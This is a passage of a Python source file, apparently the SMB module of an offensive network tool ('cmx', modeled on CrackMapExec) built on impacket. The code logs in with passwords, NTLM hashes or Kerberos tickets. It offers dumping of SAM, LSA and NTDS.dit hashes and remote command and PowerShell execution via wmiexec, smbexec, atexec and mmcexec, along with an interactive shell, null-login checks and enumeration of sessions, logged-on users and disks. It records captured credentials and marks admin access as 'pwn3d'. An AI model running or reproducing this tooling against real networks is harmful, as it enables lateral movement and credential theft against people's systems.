#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import ntpath
from impacket.smbconnection import SMBConnection, SessionError
from impacket.smb import SMB_DIALECT
from impacket.smb3structs import SMB2_DIALECT_002, SMB2_DIALECT_21
from impacket.examples.secretsdump import RemoteOperations, SAMHashes
from impacket.examples.secretsdump import LSASecrets, NTDSHashes
from impacket.dcerpc.v5 import lsat, lsad
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.transport import DCERPCTransportFactory
from impacket.dcerpc.v5.epm import MSRPC_UUID_PORTMAP
from impacket.dcerpc.v5.dcom.wmi import WBEM_FLAG_FORWARD_ONLY
from impacket.dcerpc.v5.samr import SID_NAME_USE
from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED
from cmx.connection import *
from cmx.logger import CMXLogAdapter
from cmx.servers.smb import CMXSMBServer
from cmx.protocols.smb.wmiexec import WMIEXEC
from cmx.protocols.smb.atexec import TSCH_EXEC
from cmx.protocols.smb.smbexec import SMBEXEC
from cmx.protocols.smb.mmcexec import MMCEXEC
from cmx.protocols.smb.smbspider import SMBSpider
from cmx.protocols.smb.passpol import PassPolDump
from cmx.helpers.logger import highlight
from cmx.helpers.misc import *
from cmx.helpers.powershell import create_ps_command
from cmx.helpers.powerview import RPCRequester
from cmx import config as cfg
import time
from datetime import datetime
from functools import wraps
from traceback import format_exc
from io import StringIO

# added for powerview functionality
from impacket.dcerpc.v5 import transport, scmr, srvs
from impacket.dcerpc.v5 import wkst, samr
from impacket.nt_errors import STATUS_MORE_ENTRIES
import pdb

from impacket.dcerpc.v5.drsuapi import MSRPC_UUID_DRSUAPI
from impacket.dcerpc.v5.epm import hept_map
from impacket.dcerpc.v5 import epm

smb_share_name = gen_random_string(5).upper()
smb_server = None


def requires_smb_server(func):
    def _decorator(self, *args, **kwargs):
        global smb_server
        global smb_share_name

        get_output = False
        payload = None
        methods = []

        try:
            payload = args[0]
        except IndexError:
            pass
        try:
            get_output = args[1]
        except IndexError:
            pass

        try:
            methods = args[2]
        except IndexError:
            pass

        if 'payload' in kwargs:
            payload = kwargs['payload']

        if 'get_output' in kwargs:
            get_output = kwargs['get_output']

        if 'methods' in kwargs:
            methods = kwargs['methods']

        if not payload and self.args.execute:
            if not self.args.no_output:
                get_output = True

        if get_output or (methods and ('smbexec' in methods)):
            if not smb_server:
                logging.debug('Starting SMB server using share {}'.format(smb_share_name))
                logging.debug('Computeraccount {}'.format(self.hostname))

                # Need to calculate user/pass/hash thing here.
                smb_server = CMXSMBServer(self.logger, smb_share_name,
                                          verbose=self.args.verbose,
                                          username=self.args.username,
                                          password=self.args.password,
                                          computer=self.hostname)
                smb_server.start()

        output = func(self, *args, **kwargs)

        if smb_server is not None:
            smb_server.shutdown()
            smb_server = None

        return output

    return wraps(func)(_decorator)

#################################################################################################
#################################################################################################


#################################################################################################
#################################################################################################


class smb(connection):
    """SMB connection class object.

    Longer class information....

    Attributes:
        domain          :
        server_os       : string ~ Windows Server 2012 R2 Datacenter 9600
        os_arch         : int ~ 32 | 64
        hash            : string
        lmhash          :
        nthash          :
        remote_ops      :
        bootkey         :
        output_filename :
        smbv            :
        signing         :
        smb_share_name  :

    """

    def __init__(self, args, db, host):
        """Inits SMB class."""
        self.domain = None
        self.server_os = None
        self.os_arch = 0
        self.hash = None
        self.lmhash = ''
        self.nthash = ''
        self.remote_ops = None
        self.bootkey = None
        self.output_filename = None
        self.smbv = None
        self.signing = False
        self.smb_share_name = smb_share_name
        self.debug = args.verbose
        self.dc_ip = args.domaincontroller
        self.domain_dns = None

        connection.__init__(self, args, db, host)

    @staticmethod
    def proto_args(parser, std_parser, module_parser):
        smb_parser = parser.add_parser('smb', help="Attacks and enum over SMB", parents=[std_parser, module_parser])
        smb_parser.add_argument("-H", '--hash', metavar="HASH", dest='hash', nargs='+', default=[], help='NTLM hash(es) or file(s) containing NTLM hashes')
        smb_parser.add_argument("-tgt", '--tgticket', metavar="TGT", dest='tgt', nargs='+', default=[], help='KerberosTGT')
        smb_parser.add_argument("-tgs", '--tgservice', metavar="TGS", dest='tgs', nargs='+', default=[], help='KerberosTGS')
        smb_parser.add_argument("-dc", '--domaincontroller', type=str, default='', help='the IP of a domain controller')
        smb_parser.add_argument("-a", '--all', action='store_true', help='Runs all the stuffs . this is for debugging, use at own risk')
        igroup = smb_parser.add_mutually_exclusive_group()
        igroup.add_argument("-i", '--interactive', action='store_true', help='Start an interactive command prompt')
        
        dgroup = smb_parser.add_mutually_exclusive_group()
        dgroup.add_argument("-d", metavar="DOMAIN.DOMAIN", dest='domain', type=str, help="domain to authenticate to, MUST BE fully qualified. ie CONTOSO.LOCAL or CONTOSO.COM ")
        dgroup.add_argument("--local-auth", action='store_true', help='authenticate locally to each target')
        
        smb_parser.add_argument("--port", type=int, choices={445, 139}, default=445, help="SMB port (default: 445)")
        smb_parser.add_argument("--share", metavar="SHARE", default="C$", help="specify a share (default: C$)")
        smb_parser.add_argument("--gen-relay-list", metavar='OUTPUT_FILE', help="outputs all hosts that don't require SMB signing to the specified file")
        smb_parser.add_argument("--continue-on-success", action='store_true', help="continues authentication attempts even after successes")
        
        cgroup = smb_parser.add_argument_group("Credential Gathering", "Options for gathering credentials")
        cegroup = cgroup.add_mutually_exclusive_group()
        cegroup.add_argument("--sam", action='store_true', help='dump SAM hashes from target systems')
        cegroup.add_argument("--lsa", action='store_true', help='dump LSA secrets from target systems')
        #cegroup.add_argument("--dcsync", action='store_true', help='dcsync')
        cegroup.add_argument("--ntds", choices={'vss', 'drsuapi'}, nargs='?', const='drsuapi', help="dump the NTDS.dit from target DCs using the specifed method\n(default: drsuapi)")
        cgroup.add_argument("--ntds-history", action='store_true', help='Dump NTDS.dit password history - Can only be used with --ntds')
        cgroup.add_argument("--ntds-pwdLastSet", action='store_true', help='Shows the pwdLastSet attribute for each NTDS.dit account. Can only be used with --ntds')
        cgroup.add_argument("--ntds-status", action='store_true', help='Display the user status (enabled/disabled) - Can only be used with --ntds')

        egroup = smb_parser.add_argument_group("Mapping/Enumeration", "Options for Mapping/Enumerating")
        egroup.add_argument("--shares", action="store_true", help="enumerate shares and access")
        egroup.add_argument("--sessions", action='store_true', help='enumerate active sessions')
        egroup.add_argument('--disks', action='store_true', help='enumerate disks')
        egroup.add_argument("--loggedon", action='store_true', help='enumerate logged on users')
        egroup.add_argument('--users', nargs='?', const='', metavar='USER', help='enumerate domain users, if a user is specified than only its information is queried. Requires -dc or -d set')
        egroup.add_argument("--groups", nargs='?', const='', metavar='GROUP', help='enumerate domain groups, if a group is specified than its members are enumerated. Requires -dc or -d set')
        egroup.add_argument("--group", nargs='?', const='', metavar='targetGroup', help='enumerate a specified domain group, if a group is specified than its members are enumerated')
        egroup.add_argument("--computers", nargs='?', const='', metavar='COMPUTER', help='enumerate domain computers, if a computer is specified than only its information is queried. Requires -dc or -d set')
        egroup.add_argument("--local-groups", nargs='?', const='', metavar='LOCAL_GROUPS', help='enumerate local groups, if a group is specified than its members are enumerated')
        egroup.add_argument("--local-users", nargs='?', const='', metavar='LOCAL_USERS', help='enumerate local users, if a user is specified than only its information is queried.')
        egroup.add_argument("--pass-pol", action='store_true', help='dump password policy')
        egroup.add_argument("--rid-brute", nargs='?', type=int, const=4000, metavar='MAX_RID', help='enumerate users by bruteforcing RID\'s (default: 4000)')
        egroup.add_argument("--wmi", metavar='QUERY', type=str, help='issues the specified WMI query')
        egroup.add_argument("--wmi-namespace", metavar='NAMESPACE', default='root\\cimv2', help='WMI Namespace (default: root\\cimv2)')

        sgroup = smb_parser.add_argument_group("Spidering", "Options for spidering shares")
        sgroup.add_argument("--spider", metavar='SHARE', type=str, help='share to spider')
        sgroup.add_argument("--spider-folder", metavar='FOLDER', default='.', type=str, help='folder to spider (default: root share directory)')
        sgroup.add_argument("--content", action='store_true', help='enable file content searching')
        sgroup.add_argument("--exclude-dirs", type=str, metavar='DIR_LIST', default='', help='directories to exclude from spidering')
        segroup = sgroup.add_mutually_exclusive_group()
        segroup.add_argument("--pattern", nargs='+', help='pattern(s) to search for in folders, filenames and file content')
        segroup.add_argument("--regex", nargs='+', help='regex(s) to search for in folders, filenames and file content')
        sgroup.add_argument("--depth", type=int, default=None, help='max spider recursion depth (default: infinity & beyond)')
        sgroup.add_argument("--only-files", action='store_true', help='only spider files')

        cgroup = smb_parser.add_argument_group("Command Execution", "Options for executing commands")
        cgroup.add_argument('--exec-method', choices={"wmiexec", "mmcexec", "smbexec", "atexec"}, default='wmiexec', help="method to execute the command. (default: wmiexec)")
        cgroup.add_argument('--force-ps32', action='store_true', help='force the PowerShell command to run in a 32-bit process')
        cgroup.add_argument('--no-output', action='store_true', help='do not retrieve command output')
        cegroup = cgroup.add_mutually_exclusive_group()
        cegroup.add_argument("-x", metavar="COMMAND", dest='execute', help="execute the specified command")
        cegroup.add_argument("-X", metavar="PS_COMMAND", dest='ps_execute', help='execute the specified PowerShell command')


        return parser

    def proto_logger(self):
        """
        Sets up logger.
        First thing called for a connection, inside proto_flow()
        """
        self.logger = CMXLogAdapter(extra={
                                        'protocol': 'SMB',
                                        'host': self.host,
                                        'port': self.args.port,
                                        'hostname': self.hostname
                                        })


###############################################################################

       ####### #     # #######  #####  #     # ####### ####### 
       #        #   #  #       #     # #     #    #    #       
       #         # #   #       #       #     #    #    #       
       #####      #    #####   #       #     #    #    #####   
       #         # #   #       #       #     #    #    #       
       #        #   #  #       #     # #     #    #    #       
       ####### #     # #######  #####   #####     #    ####### 

###############################################################################
###############################################################################
#   Execution functions
#
# This section:
#   execute
#   ps_execute
#   wmi
#   interactive
#
###############################################################################

    @requires_admin
    @requires_smb_server
    def execute(self, payload=None, get_output=False, methods=None):
        """Redirects execution to the specified method
        Defaults to wmiexec

        Args:

        Raises:

        Returns:

        """

        if self.args.exec_method:
            methods = [self.args.exec_method]

        if not methods:
            methods = ['wmiexec', 'mmcexec', 'atexec', 'smbexec']

        if not payload and self.args.execute:
            payload = self.args.execute
            if not self.args.no_output:
                get_output = True

        for method in methods:

            if method == 'wmiexec':
                try:
                    exec_method = WMIEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash, self.args.share)
                    logging.debug('Executed command via wmiexec')
                    break
                except:
                    logging.debug('Error executing command via wmiexec, traceback:')
                    logging.debug(format_exc())
                    continue

            elif method == 'mmcexec':
                try:
                    exec_method = MMCEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash)
                    logging.debug('Executed command via mmcexec')
                    break
                except:
                    logging.debug('Error executing command via mmcexec, traceback:')
                    logging.debug(format_exc())
                    continue

            elif method == 'atexec':
                try:
                    exec_method = TSCH_EXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.hash) #self.args.share)
                    logging.debug('Executed command via atexec')
                    break
                except:
                    logging.debug('Error executing command via atexec, traceback:')
                    logging.debug(format_exc())
                    continue

            elif method == 'smbexec':
                try:
                    exec_method = SMBEXEC(self.host, self.smb_share_name, self.args.port, self.username, self.password, self.domain, self.hash, self.args.share)
                    logging.debug('Executed command via smbexec')
                    break
                except:
                    logging.debug('Error executing command via smbexec, traceback:')
                    logging.debug(format_exc())
                    return 'fail'

        if hasattr(self, 'server'): self.server.track_host(self.host)
        self.logger.info('Executing Command')

        meth = 'wmiexec'
        if self.args.exec_method: 
            meth = self.args.exec_method

        self.logger.debug('Executing {} via {}'.format(payload,meth))


        output = '{}'.format(exec_method.execute(payload, get_output).strip())
        self.logger.success('Execution Completed.')
       
        # Read output if a manual command was provided to run on the remote host 
        if self.args.execute or self.args.ps_execute:
            self.logger.success('Results:')

            buf = StringIO(output).readlines()
            for line in buf:
                self.logger.highlight('    '+line.strip())

        return output


    @requires_admin
    def ps_execute(self, payload=None, get_output=False, methods=None, force_ps32=False, dont_obfs=False):
        """Execute a powershell command

        Args:

        Raises:

        Returns:

        """
        if not payload and self.args.ps_execute:
            payload = self.args.ps_execute
            if not self.args.no_output: get_output = True
        logging.debug("here and its {}".format(self.server_os))

        return self.execute(create_ps_command(payload, force_ps32=force_ps32, dont_obfs=False, server_os=self.server_os), get_output, methods)


    @requires_admin
    def wmi(self, wmi_query=None, namespace=None):
        """Execute via WMI

        Args:

        Raises:

        Returns:

        """
        self.logger.announce('Executing query:"{}" over wmi...'.format(str(wmi_query)))
        records = []
        if not namespace:
            namespace = self.args.wmi_namespace

        try:
            rpc = RPCRequester(self.host, self.domain, self.username, self.password, self.lmhash, self.nthash)
            rpc._create_wmi_connection(namespace=namespace)

            if wmi_query:
                query = rpc._wmi_connection.ExecQuery(wmi_query, lFlags=WBEM_FLAG_FORWARD_ONLY)
            else:
                query = rpc._wmi_connection.ExecQuery(self.args.wmi, lFlags=WBEM_FLAG_FORWARD_ONLY)
        except Exception as e:
            self.logger.error('Error creating WMI connection: {}'.format(e))
            return records

        while True:
            try:
                wmi_results = query.Next(0xffffffff, 1)[0]
                record = wmi_results.getProperties()
                records.append(record)
                for k,v in record.items():
                    self.logger.highlight('{} => {}'.format(k,v['value']))
                self.logger.highlight('')
            except Exception as e:
                if str(e).find('S_FALSE') < 0:
                    raise e
                else:
                    break

        return records

#########################

    @requires_admin
    @requires_smb_server
    def interactive(self, payload=None, get_output=False, methods=None):
        self.logger.announce("Bout to get shellular")

        if not methods:
            methods = ['wmiexec', 'mmcexec', 'atexec', 'smbexec']

        for method in methods:
            if method == 'wmiexec':
                try:
                    exec_method = WMIEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash, self.args.share)
                    logging.debug('Interactive shell using wmiexec')
                    break
                except:
                    logging.debug('Error launching shell via wmiexec, traceback:')
                    logging.debug(format_exc())
                    continue

            elif method == 'mmcexec':
                try:
                    exec_method = MMCEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash)
                    logging.debug('Interactive shell using mmcexec')
                    break
                except:
                    logging.debug('Error launching shell via mmcexec, traceback:')
                    logging.debug(format_exc())
                    continue

            elif method == 'atexec':
                try:
                    exec_method = TSCH_EXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.hash) #self.args.share)
                    logging.debug('Interactive shell using atexec')
                    break
                except:
                    logging.debug('Error launching shell via atexec, traceback:')
                    logging.debug(format_exc())
                    continue

            elif method == 'smbexec':
                try:
                    exec_method = SMBEXEC(self.host, self.smb_share_name, self.args.port, self.username, self.password, self.domain, self.hash, self.args.share)
                    logging.debug('Interactive shell using smbexec')
                    break
                except:
                    logging.debug('Error launching shell via smbexec, traceback:')
                    logging.debug(format_exc())
                    return 'fail'


        try:
            exec_method.run(self.host, self.host)
        except Exception as e:
            logging.debug('b {}'.format(str(e)))
        

##########################


###############################################################################

        #####  ####### #     # #     # #######  #####  ####### 
       #     # #     # ##    # ##    # #       #     #    #    
       #       #     # # #   # # #   # #       #          #    
       #       #     # #  #  # #  #  # #####   #          #    
       #       #     # #   # # #   # # #       #          #    
       #     # #     # #    ## #    ## #       #     #    #    
        #####  ####### #     # #     # #######  #####     #    
                                                      
###############################################################################
###############################################################################
#   Connection functions
#
# This section:
#   create_smbv1_conn
#   create_smbv3_conn
#   create_conn_obj
#
###############################################################################


    def create_smbv1_conn(self):
        """Setup connection using smbv1

        Args:
  
        Raises:

        Returns:

        """
        try:
            logging.debug('Attempting SMBv1 connection to {}'.format(self.host))
            self.conn = SMBConnection(self.host, self.host, None, self.args.port, preferredDialect=SMB_DIALECT)
        except socket.error as e:
            if str(e).find('Connection reset by peer') != -1:
                logging.debug('Connection was reset by target. SMBv1 might be disabled on {}'.format(self.host))
            elif str(e).find('No route to host') != -1:
                logging.debug('Could not connect to {}, no route to host. Can you ping it?'.format(self.host))
            else:
                logging.debug('Something went wrong, Could not connect to {}, tried smbv1'.format(self.host))
            return False
        except Exception as e:
            logging.debug('Error creating SMBv1 connection to {}: {}'.format(self.host, e))
            return False
        logging.debug('Connected using SMBv1 to: {}'.format(self.host))
        return True

    def create_smbv3_conn(self):
        """Setup connection using smbv3
        Used for both SMBv2 and SMBv3
        
        Args:
            
        Raises:
            
        Returns:

        """
        try:
            logging.debug('Attempting SMBv3 connection to {}'.format(self.host))
            self.conn = SMBConnection(self.host, self.host, None, self.args.port)
        except socket.error as e:
            if str(e).find('No route to host') != -1:
                logging.debug('No route to host {}'.format(self.host))
                self.logger.announce('Could not connect to {}, no route to host. Can you ping it?'.format(self.host))
            else:
                logging.debug('Something went wrong, Could not connect to {}, tried smbv3'.format(self.host))
            return False
        except Exception as e:
            logging.debug('Error creating SMBv3 connection to {}: {}'.format(self.host, e))
            return False
        logging.debug('Connected using SMBv3 to: {}'.format(self.host))
        return True

    def create_conn_obj(self):
        if self.create_smbv1_conn():
            return True
        elif self.create_smbv3_conn():
            return True

        return False



###############################################################################

        #       #######  #####  ### #     # 
        #       #     # #     #  #  ##    # 
        #       #     # #        #  # #   # 
        #       #     # #  ####  #  #  #  # 
        #       #     # #     #  #  #   # # 
        #       #     # #     #  #  #    ## 
        ####### #######  #####  ### #     # 

###############################################################################
###############################################################################
#   Login functions
#
# This section:
#   plaintext_login
#   hash_login
#
###############################################################################                        


    def plaintext_login(self, domain, username, password):
        """

        Args:
            
        Raises:
            
        Returns:

        """
        try:
            self.conn.login(username, password, domain)

            self.password = password
            self.username = username
            self.domain = domain
            self.admin_privs = self.check_if_admin()
            self.db.add_credential('plaintext', domain, username, password)

            if self.admin_privs:
                self.db.add_admin_user('plaintext', domain, username, password, self.host)

            out = '{}\\{}:{} {}'.format(domain,
                                         username,
                                         password,
                                         highlight('({})'.format(cfg.pwn3d_label) if self.admin_privs else ''))

            self.logger.success(out)
            if not self.args.continue_on_success:
                return True
        except SessionError as e:
            error, desc = e.getErrorString()
            self.logger.error('{}\\{}:{} {} {}'.format(domain,
                                                        username,
                                                        password,
                                                        error,
                                                        '({})'.format(desc) if self.args.verbose else ''))

            if error == 'STATUS_LOGON_FAILURE': self.inc_failed_login(username)

            return False

    def hash_login(self, domain, username, ntlm_hash):
        """
        
        Args:
            
        Raises:
            
        Returns:

        """
        lmhash = ''
        nthash = ''

        #This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find(':') != -1:
            lmhash, nthash = ntlm_hash.split(':')
        else:
            nthash = ntlm_hash

        try:
            self.conn.login(username, '', domain, lmhash, nthash)

            self.hash = ntlm_hash
            if lmhash: self.lmhash = lmhash
            if nthash: self.nthash = nthash

            self.username = username
            self.domain = domain
            self.check_if_admin()
            self.db.add_credential('hash', domain, username, ntlm_hash)

            if self.admin_privs:
                self.db.add_admin_user('hash', domain, username, ntlm_hash, self.host)

            out = '{}\\{} {} {}'.format(domain,
                                         username,
                                         ntlm_hash,
                                         highlight('({})'.format(cfg.pwn3d_label) if self.admin_privs else ''))

            self.logger.success(out)
            if not self.args.continue_on_success:
                return True
        except SessionError as e:
            error, desc = e.getErrorString()
            self.logger.error('{}\\{} {} {} {}'.format(domain,
                                                        username,
                                                        ntlm_hash,
                                                        error,
                                                        '({})'.format(desc) if self.args.verbose else ''))

            if error == 'STATUS_LOGON_FAILURE': self.inc_failed_login(username)

            return False


    def kerberosLogin(self, user, password, domain='', ntlm_hash='', aesKey='', kdcHost=None, TGT=None,
                      TGS=None):
        """
        logins into the target system explicitly using Kerberos. Hashes are used if RC4_HMAC is supported.

        :param string user: username
        :param string password: password for the user
        :param string domain: domain where the account is valid for (required)
        :param string lmhash: LMHASH used to authenticate using hashes (password is not used)
        :param string nthash: NTHASH used to authenticate using hashes (password is not used)
        :param string aesKey: aes256-cts-hmac-sha1-96 or aes128-cts-hmac-sha1-96 used for Kerberos authentication
        :param string kdcHost: hostname or IP Address for the KDC. If None, the domain will be used (it needs to resolve tho)
        :param struct TGT: If there's a TGT available, send the structure here and it will be used
        :param struct TGS: same for TGS. See smb3.py for the format

        :return: None, raises a Session Error if error.
        """
        import os
        from impacket.krb5.ccache import CCache
        from impacket.krb5.kerberosv5 import KerberosError
        from impacket.krb5 import constants

        if kdcHost is None:
            self._kdcHost = self.dc_ip

        lmhash = ''
        nthash = ''

        #This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find(':') != -1:
            lmhash, nthash = ntlm_hash.split(':')
        else:
            nthash = ntlm_hash


        if TGT is None and TGS is None:
            self.logger.error("TGT or TGS required")
            return False


        while True:
            try:
                if self.smbv == '1':
                    return self.conn.kerberos_login(user, password, domain, lmhash, nthash, aesKey, kdcHost,
                                                              TGT, TGS)
                return self.conn.kerberosLogin(user, password, domain, lmhash, nthash, aesKey, kdcHost, TGT,
                                                         TGS)
            except (smb.SessionError, smb3.SessionError) as e:
                raise SessionError(e.get_error_code(), e.get_error_packet())
            except KerberosError as e:
                if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                    # We might face this if the target does not support AES
                    # So, if that's the case we'll force using RC4 by converting
                    # the password to lm/nt hashes and hope for the best. If that's already
                    # done, byebye.
                    if lmhash is '' and nthash is '' and (aesKey is '' or aesKey is None) and TGT is None and TGS is None:
                        lmhash = compute_lmhash(password)
                        nthash = compute_nthash(password) 
                    else:
                        raise e
                else:
                    raise e


###############################################################################

#     # #######  #####  #######       ####### #     # #     # #     # 
#     # #     # #     #    #          #       ##    # #     # ##   ## 
#     # #     # #          #          #       # #   # #     # # # # # 
####### #     #  #####     #    ##### #####   #  #  # #     # #  #  # 
#     # #     #       #    #          #       #   # # #     # #     # 
#     # #     # #     #    #          #       #    ## #     # #     # 
#     # #######  #####     #          ####### #     #  #####  #     # 

###############################################################################
###############################################################################
#    Host Enum Functions
#
# This section:
#   enum_host_info
#   disks
#   sessions
#   loggedon
#   local_users
#   local_groups
#   rid_brute
#   spider
#
####################################################################################


    def enum_host_info(self):
        """
        
        Args:
            
        Raises:
            
        Returns:

        """
        self.local_ip = self.conn.getSMBServer().get_socket().getsockname()[0]

        try:
            self.conn.login('' , '')
            logging.debug("Null login?")
            self.logger.success('Null login allowed')
        except SessionError as e:
            if "STATUS_ACCESS_DENIED" in str(e):
                pass

        self.domain     = self.conn.getServerDomain()    # OCEAN
        self.hostname   = self.conn.getServerName()      # WIN7-PC
        self.server_os  = self.conn.getServerOS()        # WIndows 6.1 Build 7601
        self.signing    = self.conn.isSigningRequired()  # True/false
        self.os_arch    = self.get_os_arch()             # 64
        self.domain_dns = self.conn.getServerDNSDomainName()

        self.logger.hostname = self.hostname   
        dialect = self.conn.getDialect()

        #print (self.conn.getServerDomain())            # OCEAN
        #print (self.conn.getServerName())              # WIN7-PC
        #print (self.conn.getServerOS())                # WIndows 6.1 Build 7601
        #print (self.conn.isSigningRequired())          # True
        #print (self.get_os_arch())                     # 64
        #print (self.conn.getDialect())                 # 528
        #print (self.conn.getRemoteHost())              # IPaddress
        #print (self.conn.getRemoteName())              # win7-pc
        #print (self.conn.getServerDNSDomainName())     # ocean.depth
        #print (self.conn.getServerOSMajor())           # 6
        #print (self.conn.getServerOSMinor())           # 1
        #print (self.conn.getServerOSBuild())           # 7601 
        #print (self.conn.doesSupportNTLMv2())          # True
        #print (self.conn.isLoginRequired())            # True

        if dialect == SMB_DIALECT:
            self.smbv = '1'
            logging.debug("SMBv1 dialect used")
        elif dialect == SMB2_DIALECT_002:
            self.smbv = '2.0'
            logging.debug("SMBv2.0 dialect used")
        elif dialect == SMB2_DIALECT_21:
            self.smbv = '2.1'
            logging.debug("SMBv2.1 dialect used")
        else:
            self.smbv = '3.0'
            logging.debug("SMBv3.0 dialect used")

        # Get the DC if we arent local-auth and didnt specify
        if not self.args.local_auth and self.dc_ip =='':
            self.dc_ip = self.conn.getServerDNSDomainName()

        if self.args.domain:
            self.domain = self.args.domain

        if not self.domain:
            self.domain = self.hostname

        self.db.add_computer(self.host, self.hostname, self.domain, self.server_os)

        try:
            ''' DC's seem to want us to logoff first, windows workstations sometimes reset the connection
            '''
            self.conn.logoff()
        except:
            pass

        if self.args.local_auth:
            self.domain = self.hostname

        self.output_filename = '{}/{}_{}_{}'.format(cfg.LOGS_PATH,self.hostname, self.host, datetime.now().strftime("%Y-%m-%d_%H%M%S"))
        #Re-connect since we logged off
        self.create_conn_obj()


    def disks(self):
        """Enumerate disks
        
        Args:
            
        Raises:
            
        Returns:

        """
        self.logger.announce('Attempting to enum disks...')
        try:
            rpctransport = transport.SMBTransport(self.host, 445, r'\srvsvc', smb_connection=self.conn)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            try:
                logging.debug('disks Binding start')
                dce.bind(srvs.MSRPC_UUID_SRVS)
                try:
                    logging.debug('Get disks via hNetrServerDiskEnum...')
                    #self.logger.info('Attempting to enum disks...')
                    resp = srvs.hNetrServerDiskEnum(dce, 0)  
                    self.logger.success('Disks enumerated on {} !'.format(self.host))

                    for disk in resp['DiskInfoStruct']['Buffer']:
                        if disk['Disk'] != '\x00':
                            #self.logger.results('Disk: {} found on {}'.format(disk['Disk'], self.host))
                            self.logger.highlight("Found Disk: {}:\\ ".format(disk['Disk']))
                    return list()

                except Exception as e: #failed function
                    logging.debug('a {}'.format(str(e)))
                    #logging.debug('a')
                    dce.disconnect()
                    return list()
            except Exception as e: #failed bind
                logging.debug('b {}'.format(str(e)))
                #logging.debug('b')
                dce.disconnect()
                return list()
        except Exception as e: #failed connect
            logging.debug('c {}'.format(str(e)))
            #logging.debug('c')
            dce.disconnect()
            return list()

        dce.disconnect()
        return list()


    def sessions(self):
        """Enumerate sessions
        
        Using impackets hNetrSessionEnum from https://github.com/SecureAuthCorp/impacket/blob/ec9d119d102251d13e2f9b4ff25966220f4005e9/impacket/dcerpc/v5/srvs.py

        *** This was supposed to grab a list of all computers, then do session enum - or thats what it sounds like in impackets version
        Actually, looks at the target and identifes sessions and their originating host.
        
        Args:
            
        Raises:
            
        Returns:

        """
        self.logger.announce('Starting Session Enum')
        try:
            rpctransport = transport.SMBTransport(self.host, 445, r'\srvsvc', smb_connection=self.conn)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            try:
                logging.debug('netsessions Binding start')
                dce.bind(srvs.MSRPC_UUID_SRVS)
                try:
                    logging.debug('Get netsessions via hNetrSessionEnum...')
                    self.logger.success('Sessions enumerated on {} !'.format(self.host))
                    resp = srvs.hNetrSessionEnum(dce, '\x00', '\x00', 10)  #no clue why \x00 is used for client and username?? but it works!

                    for session in resp['InfoStruct']['SessionInfo']['Level10']['Buffer']:
                        userName = session['sesi10_username'][:-1]
                        sourceIP = session['sesi10_cname'][:-1][2:]
                        #self.logger.results('User: {} has session originating from {}'.format(userName, sourceIP))
                        self.logger.highlight("{} has session originating from {} on {}".format(userName, sourceIP, self.host,))
                    return list()

                except Exception as e: #failed function
                    logging.debug('a {}'.format(str(e)))
                    #logging.debug('a')
                    dce.disconnect()
                    return list()
            except Exception as e: #failed bind
                logging.debug('b {}'.format(str(e)))
                #logging.debug('b')
                dce.disconnect()
                return list()
        except Exception as e: #failed connect
            logging.debug('c {}'.format(str(e)))
            #logging.debug('c')
            dce.disconnect()
            return list()
        self.logger.announce('Finished Session Enum')
        dce.disconnect()
        return list()


    def loggedon(self):
        """
        
        Args:
            
        Raises:
            
        Returns:

        """

        loggedon = []
        self.logger.announce('Checking for logged on users')
        try:
            rpctransport = transport.SMBTransport(self.host, 445, r'\wkssvc', smb_connection=self.conn)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            try:
                logging.debug('loggedon Binding start')
                dce.bind(wkst.MSRPC_UUID_WKST)
                try:
                    logging.debug('Get loggedonUsers via hNetrWkstaUserEnum...')
                    #self.logger.info('Attempting to enum loggedon users...')
                    resp = wkst.hNetrWkstaUserEnum(dce, 1)   # theres a version that takes 0, not sure the difference?
                    self.logger.success('Loggedon-Users enumerated on {} !'.format(self.host))

                    for wksta_user in resp['UserInfo']['WkstaUserInfo']['Level1']['Buffer']:
                        wkst_username = wksta_user['wkui1_username'][:-1] # These are defined in https://github.com/SecureAuthCorp/impacket/blob/master/impacket/dcerpc/v5/wkst.py#WKSTA_USER_INFO_1
                        #self.logger.results('User:{} is currently logged on {}'.format(wkst_username,self.host))
                        self.logger.highlight("{} is currently logged on {} ({})".format(wkst_username, self.host, self.hostname))

                    return list()

                except Exception as e: #failed function
                    logging.debug('a {}'.format(str(e)))
                    #logging.debug('a')
                    dce.disconnect()
                    return list()
            except Exception as e: #failed bind
                logging.debug('b {}'.format(str(e)))
                #logging.debug('b')
                dce.disconnect()
                return list()
        except Exception as e: #failed connect
            logging.debug('c {}'.format(str(e)))
            #logging.debug('c')
            dce.disconnect()
            return list()
        self.logger.announce('Finished checking for logged on users')
        dce.disconnect()
        return list()


    def local_users(self):
        """
        To enumerate local users
        
        Args:
            
        Raises:
            
        Returns:

        """
        users = []
        self.logger.announce('Checking Local Users')

        try:
            rpctransport = transport.SMBTransport(self.host, 445, r'\samr', username=self.username, password=self.password, smb_connection=self.conn)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            try:
                logging.debug('net local users Binding start')
                dce.bind(samr.MSRPC_UUID_SAMR)
                try:
                    logging.debug('Connect w/ hSamrConnect...')
                    resp = samr.hSamrConnect(dce)  

                    logging.debug('Dump of hSamrConnect response:') 
                    if self.debug:
                        resp.dump()
                    
                    self.logger.debug('Looking up host name')
                    serverHandle = resp['ServerHandle'] 
                    resp2 = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
                    logging.debug('Dump of hSamrEnumerateDomainsInSamServer response:') 
                    if self.debug:
                        resp2.dump()

                    domains = resp2['Buffer']['Buffer']
                    logging.debug('Looking up localusers on: '+ domains[0]['Name'])
                    resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle, domains[0]['Name'])

                    logging.debug('Dump of hSamrLookupDomainInSamServer response:' )
                    if self.debug:
                        resp.dump()

